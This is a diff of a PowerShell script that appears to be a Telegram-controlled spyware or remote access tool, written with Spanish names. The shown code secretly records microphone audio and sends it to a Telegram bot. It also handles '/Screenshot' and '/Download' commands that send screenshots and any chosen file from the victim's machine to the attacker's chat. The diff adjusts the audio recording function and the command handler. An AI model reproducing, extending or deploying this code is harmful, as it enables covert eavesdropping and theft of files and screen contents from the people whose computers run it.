@@ -133,6 +133,7 @@ function graba-audio { param ($botkey,$chat_id,$segundos)
 $ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
 $audio = $ruta + "\" + "audio.wav"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
 Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
 bot-send -file $audio -botkey $botkey -chat_id $chat_id
 
@@ -153,7 +154,7 @@ test-command {param ($comando="",$botkey="",$chat_id="")
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
- if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $segundos}
+ if ($comando -like "/Audio*") {$comando = $comando -replace "/Audio ","";Write-Host "Segundos $comando"}
 
 
 }
